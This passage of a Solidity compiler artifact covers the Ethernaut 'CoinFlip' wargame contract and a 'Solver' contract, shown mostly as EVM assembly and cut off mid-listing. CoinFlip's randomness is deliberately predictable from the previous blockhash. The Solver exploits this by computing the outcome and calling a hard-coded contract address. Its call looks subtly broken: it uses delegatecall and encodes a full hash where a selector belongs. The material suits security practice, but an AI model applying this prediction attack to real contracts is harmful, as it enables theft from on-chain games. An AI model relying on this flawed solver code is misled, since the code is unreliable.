										{
											"begin": 1627,
											"end": 1717,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1760,
											"end": 1767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1789,
											"end": 1794,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1794,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1723,
											"end": 1800,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1845,
											"end": 1848,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1886,
											"end": 1891,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1868,
											"end": 1892,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1859,
											"end": 1892,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1859,
											"end": 1892,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1914,
											"end": 1980,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1907,
											"end": 1912,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1904,
											"end": 1981,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1984,
											"end": 2002,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1901,
											"end": 2004,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2031,
											"end": 2032,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 2024,
											"end": 2029,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2020,
											"end": 2033,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2013,
											"end": 2033,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2013,
											"end": 2033,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 2039,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2045,
											"end": 2225,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 2045,
											"end": 2225,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2093,
											"end": 2170,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2090,
											"end": 2091,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2083,
											"end": 2171,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2190,
											"end": 2194,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 2187,
											"end": 2188,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2180,
											"end": 2195,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2214,
											"end": 2218,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2211,
											"end": 2212,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2204,
											"end": 2219,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2231,
											"end": 2411,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 2231,
											"end": 2411,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2279,
											"end": 2356,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2276,
											"end": 2277,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2269,
											"end": 2357,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2376,
											"end": 2380,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 2373,
											"end": 2374,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2366,
											"end": 2381,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2400,
											"end": 2404,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2397,
											"end": 2398,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2390,
											"end": 2405,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2540,
											"end": 2657,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 2540,
											"end": 2657,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2649,
											"end": 2650,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2646,
											"end": 2647,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2639,
											"end": 2651,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2748,
											"end": 2753,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "tag",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2733,
											"end": 2754,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2726,
											"end": 2731,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2723,
											"end": 2755,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2769,
											"end": 2770,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2766,
											"end": 2767,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2759,
											"end": 2771,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "tag",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2713,
											"end": 2773,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2663,
											"end": 2779,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut.sol\":\"CoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut.sol\":{\"keccak256\":\"0x3603274c291fc50b16feaca60d45e82373024e44ffd66ded55d4f50c4ef1c64a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b04c8bea2c1e2e35eea63d49c4bfb4dcbc9a5747ee8b842520ed3371d2f7cbcc\",\"dweb:/ipfs/QmTWy2bqSioebXwFghsoBtWL52o88PAWmkC5JMSU1cB2DM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "ethernaut.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Solver": {
					"abi": [
						{
							"inputs": [],
							"name": "solve",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut.sol\":810:1365  contract Solver {\r... */\n  mstore(0x40, 0x80)\n    /* \"ethernaut.sol\":850:927  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"ethernaut.sol\":833:927  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x00\n  sstore\n    /* \"ethernaut.sol\":957:999  0xECd6671D91e677522f698C59B7B7F69A0682D975 */\n  0xecd6671d91e677522f698c59b7b7f69a0682d975\n    /* \"ethernaut.sol\":934:999  address contractAddr = 0xECd6671D91e677522f698C59B7B7F69A0682D975 */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"ethernaut.sol\":810:1365  contract Solver {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut.sol\":810:1365  contract Solver {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":1006:1362  function solve() public returns (uint256) {\r... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"ethernaut.sol\":1039:1046  uint256 */\n      0x00\n        /* \"ethernaut.sol\":1059:1074  bool whatToSend */\n      dup1\n        /* \"ethernaut.sol\":1125:1126  0 */\n      0x00\n        /* \"ethernaut.sol\":1116:1122  FACTOR */\n      dup1\n      sload\n        /* \"ethernaut.sol\":1110:1111  1 */\n      0x01\n        /* \"ethernaut.sol\":1095:1107  block.number */\n      number\n        /* \"ethernaut.sol\":1095:1111  block.number - 1 */\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n        /* \"ethernaut.sol\":1085:1112  blockhash(block.number - 1) */\n      blockhash\n        /* \"ethernaut.sol\":1077:1113  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"ethernaut.sol\":1077:1122  uint256(blockhash(block.number - 1)) / FACTOR */\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n        /* \"ethernaut.sol\":1077:1126  uint256(blockhash(block.number - 1)) / FACTOR > 0 */\n      gt\n        /* \"ethernaut.sol\":1059:1126  bool whatToSend = uint256(blockhash(block.number - 1)) / FACTOR > 0 */\n      swap1\n      pop\n        /* \"ethernaut.sol\":1140:1150  whatToSend */\n      dup1\n        /* \"ethernaut.sol\":1137:1355  if(whatToSend){\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"ethernaut.sol\":1166:1178  contractAddr */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1166:1191  contractAddr.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1203:1226  keccak256(\"flip(bool)\") */\n      0x1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d\n        /* \"ethernaut.sol\":1227:1231  true */\n      0x01\n        /* \"ethernaut.sol\":1192:1232  abi.encode(keccak256(\"flip(bool)\"),true) */\n      add(0x20, mload(0x40))\n      tag_14\n      swap3\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"ethernaut.sol\":1166:1233  contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),true)) */\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_20\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_19)\n    tag_20:\n      0x60\n      swap2\n      pop\n    tag_19:\n      pop\n      pop\n      pop\n        /* \"ethernaut.sol\":1137:1355  if(whatToSend){\r... */\n      jump(tag_21)\n    tag_13:\n        /* \"ethernaut.sol\":1275:1287  contractAddr */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1275:1300  contractAddr.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernaut.sol\":1312:1335  keccak256(\"flip(bool)\") */\n      0x1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d\n        /* \"ethernaut.sol\":1336:1341  false */\n      0x00\n        /* \"ethernaut.sol\":1301:1342  abi.encode(keccak256(\"flip(bool)\"),false) */\n      add(0x20, mload(0x40))\n      tag_22\n      swap3\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"ethernaut.sol\":1275:1343  contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),false)) */\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_23:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_26\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_25)\n    tag_26:\n      0x60\n      swap2\n      pop\n    tag_25:\n      pop\n      pop\n      pop\n        /* \"ethernaut.sol\":1137:1355  if(whatToSend){\r... */\n    tag_21:\n        /* \"ethernaut.sol\":1048:1362  {\r... */\n      pop\n        /* \"ethernaut.sol\":1006:1362  function solve() public returns (uint256) {\r... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:116   */\n    tag_28:\n        /* \"#utility.yul\":88:109   */\n      tag_30\n        /* \"#utility.yul\":103:108   */\n      dup2\n        /* \"#utility.yul\":88:109   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":83:86   */\n      dup3\n        /* \"#utility.yul\":76:110   */\n      mstore\n        /* \"#utility.yul\":7:116   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":122:240   */\n    tag_32:\n        /* \"#utility.yul\":209:233   */\n      tag_34\n        /* \"#utility.yul\":227:232   */\n      dup2\n        /* \"#utility.yul\":209:233   */\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":204:207   */\n      dup3\n        /* \"#utility.yul\":197:234   */\n      mstore\n        /* \"#utility.yul\":122:240   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":246:619   */\n    tag_36:\n        /* \"#utility.yul\":350:353   */\n      0x00\n        /* \"#utility.yul\":378:416   */\n      tag_38\n        /* \"#utility.yul\":410:415   */\n      dup3\n        /* \"#utility.yul\":378:416   */\n      tag_39\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":432:520   */\n      tag_40\n        /* \"#utility.yul\":513:519   */\n      dup2\n        /* \"#utility.yul\":508:511   */\n      dup6\n        /* \"#utility.yul\":432:520   */\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":425:520   */\n      swap4\n      pop\n        /* \"#utility.yul\":529:581   */\n      tag_42\n        /* \"#utility.yul\":574:580   */\n      dup2\n        /* \"#utility.yul\":569:572   */\n      dup6\n        /* \"#utility.yul\":562:566   */\n      0x20\n        /* \"#utility.yul\":555:560   */\n      dup7\n        /* \"#utility.yul\":551:567   */\n      add\n        /* \"#utility.yul\":529:581   */\n      tag_43\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":606:612   */\n      dup1\n        /* \"#utility.yul\":601:604   */\n      dup5\n        /* \"#utility.yul\":597:613   */\n      add\n        /* \"#utility.yul\":590:613   */\n      swap2\n      pop\n        /* \"#utility.yul\":354:619   */\n      pop\n        /* \"#utility.yul\":246:619   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":625:743   */\n    tag_44:\n        /* \"#utility.yul\":712:736   */\n      tag_46\n        /* \"#utility.yul\":730:735   */\n      dup2\n        /* \"#utility.yul\":712:736   */\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":707:710   */\n      dup3\n        /* \"#utility.yul\":700:737   */\n      mstore\n        /* \"#utility.yul\":625:743   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":749:1020   */\n    tag_17:\n        /* \"#utility.yul\":879:882   */\n      0x00\n        /* \"#utility.yul\":901:994   */\n      tag_49\n        /* \"#utility.yul\":990:993   */\n      dup3\n        /* \"#utility.yul\":981:987   */\n      dup5\n        /* \"#utility.yul\":901:994   */\n      tag_36\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":894:994   */\n      swap2\n      pop\n        /* \"#utility.yul\":1011:1014   */\n      dup2\n        /* \"#utility.yul\":1004:1014   */\n      swap1\n      pop\n        /* \"#utility.yul\":749:1020   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1026:1346   */\n    tag_15:\n        /* \"#utility.yul\":1141:1145   */\n      0x00\n        /* \"#utility.yul\":1179:1181   */\n      0x40\n        /* \"#utility.yul\":1168:1177   */\n      dup3\n        /* \"#utility.yul\":1164:1182   */\n      add\n        /* \"#utility.yul\":1156:1182   */\n      swap1\n      pop\n        /* \"#utility.yul\":1192:1263   */\n      tag_51\n        /* \"#utility.yul\":1260:1261   */\n      0x00\n        /* \"#utility.yul\":1249:1258   */\n      dup4\n        /* \"#utility.yul\":1245:1262   */\n      add\n        /* \"#utility.yul\":1236:1242   */\n      dup6\n        /* \"#utility.yul\":1192:1263   */\n      tag_32\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1273:1339   */\n      tag_52\n        /* \"#utility.yul\":1335:1337   */\n      0x20\n        /* \"#utility.yul\":1324:1333   */\n      dup4\n        /* \"#utility.yul\":1320:1338   */\n      add\n        /* \"#utility.yul\":1311:1317   */\n      dup5\n        /* \"#utility.yul\":1273:1339   */\n      tag_28\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1026:1346   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1352:1574   */\n    tag_7:\n        /* \"#utility.yul\":1445:1449   */\n      0x00\n        /* \"#utility.yul\":1483:1485   */\n      0x20\n        /* \"#utility.yul\":1472:1481   */\n      dup3\n        /* \"#utility.yul\":1468:1486   */\n      add\n        /* \"#utility.yul\":1460:1486   */\n      swap1\n      pop\n        /* \"#utility.yul\":1496:1567   */\n      tag_54\n        /* \"#utility.yul\":1564:1565   */\n      0x00\n        /* \"#utility.yul\":1553:1562   */\n      dup4\n        /* \"#utility.yul\":1549:1566   */\n      add\n        /* \"#utility.yul\":1540:1546   */\n      dup5\n        /* \"#utility.yul\":1496:1567   */\n      tag_44\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1352:1574   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1580:1678   */\n    tag_39:\n        /* \"#utility.yul\":1631:1637   */\n      0x00\n        /* \"#utility.yul\":1665:1670   */\n      dup2\n        /* \"#utility.yul\":1659:1671   */\n      mload\n        /* \"#utility.yul\":1649:1671   */\n      swap1\n      pop\n        /* \"#utility.yul\":1580:1678   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1684:1831   */\n    tag_41:\n        /* \"#utility.yul\":1785:1796   */\n      0x00\n        /* \"#utility.yul\":1822:1825   */\n      dup2\n        /* \"#utility.yul\":1807:1825   */\n      swap1\n      pop\n        /* \"#utility.yul\":1684:1831   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1837:2022   */\n    tag_12:\n        /* \"#utility.yul\":1877:1878   */\n      0x00\n        /* \"#utility.yul\":1894:1914   */\n      tag_58\n        /* \"#utility.yul\":1912:1913   */\n      dup3\n        /* \"#utility.yul\":1894:1914   */\n      tag_47\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1889:1914   */\n      swap2\n      pop\n        /* \"#utility.yul\":1928:1948   */\n      tag_59\n        /* \"#utility.yul\":1946:1947   */\n      dup4\n        /* \"#utility.yul\":1928:1948   */\n      tag_47\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1923:1948   */\n      swap3\n      pop\n        /* \"#utility.yul\":1967:1968   */\n      dup3\n        /* \"#utility.yul\":1957:1992   */\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1972:1990   */\n      tag_61\n      tag_62\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1957:1992   */\n    tag_60:\n        /* \"#utility.yul\":2014:2015   */\n      dup3\n        /* \"#utility.yul\":2011:2012   */\n      dup3\n        /* \"#utility.yul\":2007:2016   */\n      div\n        /* \"#utility.yul\":2002:2016   */\n      swap1\n      pop\n        /* \"#utility.yul\":1837:2022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2028:2219   */\n    tag_10:\n        /* \"#utility.yul\":2068:2072   */\n      0x00\n        /* \"#utility.yul\":2088:2108   */\n      tag_64\n        /* \"#utility.yul\":2106:2107   */\n      dup3\n        /* \"#utility.yul\":2088:2108   */\n      tag_47\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2083:2108   */\n      swap2\n      pop\n        /* \"#utility.yul\":2122:2142   */\n      tag_65\n        /* \"#utility.yul\":2140:2141   */\n      dup4\n        /* \"#utility.yul\":2122:2142   */\n      tag_47\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2117:2142   */\n      swap3\n      pop\n        /* \"#utility.yul\":2161:2162   */\n      dup3\n        /* \"#utility.yul\":2158:2159   */\n      dup3\n        /* \"#utility.yul\":2155:2163   */\n      lt\n        /* \"#utility.yul\":2152:2186   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":2166:2184   */\n      tag_67\n      tag_68\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2152:2186   */\n    tag_66:\n        /* \"#utility.yul\":2211:2212   */\n      dup3\n        /* \"#utility.yul\":2208:2209   */\n      dup3\n        /* \"#utility.yul\":2204:2213   */\n      sub\n        /* \"#utility.yul\":2196:2213   */\n      swap1\n      pop\n        /* \"#utility.yul\":2028:2219   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2225:2315   */\n    tag_31:\n        /* \"#utility.yul\":2259:2266   */\n      0x00\n        /* \"#utility.yul\":2302:2307   */\n      dup2\n        /* \"#utility.yul\":2295:2308   */\n      iszero\n        /* \"#utility.yul\":2288:2309   */\n      iszero\n        /* \"#utility.yul\":2277:2309   */\n      swap1\n      pop\n        /* \"#utility.yul\":2225:2315   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2321:2398   */\n    tag_35:\n        /* \"#utility.yul\":2358:2365   */\n      0x00\n        /* \"#utility.yul\":2387:2392   */\n      dup2\n        /* \"#utility.yul\":2376:2392   */\n      swap1\n      pop\n        /* \"#utility.yul\":2321:2398   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2404:2481   */\n    tag_47:\n        /* \"#utility.yul\":2441:2448   */\n      0x00\n        /* \"#utility.yul\":2470:2475   */\n      dup2\n        /* \"#utility.yul\":2459:2475   */\n      swap1\n      pop\n        /* \"#utility.yul\":2404:2481   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2487:2794   */\n    tag_43:\n        /* \"#utility.yul\":2555:2556   */\n      0x00\n        /* \"#utility.yul\":2565:2678   */\n    tag_73:\n        /* \"#utility.yul\":2579:2585   */\n      dup4\n        /* \"#utility.yul\":2576:2577   */\n      dup2\n        /* \"#utility.yul\":2573:2586   */\n      lt\n        /* \"#utility.yul\":2565:2678   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2664:2665   */\n      dup1\n        /* \"#utility.yul\":2659:2662   */\n      dup3\n        /* \"#utility.yul\":2655:2666   */\n      add\n        /* \"#utility.yul\":2649:2667   */\n      mload\n        /* \"#utility.yul\":2645:2646   */\n      dup2\n        /* \"#utility.yul\":2640:2643   */\n      dup5\n        /* \"#utility.yul\":2636:2647   */\n      add\n        /* \"#utility.yul\":2629:2668   */\n      mstore\n        /* \"#utility.yul\":2601:2603   */\n      0x20\n        /* \"#utility.yul\":2598:2599   */\n      dup2\n        /* \"#utility.yul\":2594:2604   */\n      add\n        /* \"#utility.yul\":2589:2604   */\n      swap1\n      pop\n        /* \"#utility.yul\":2565:2678   */\n      jump(tag_73)\n    tag_75:\n        /* 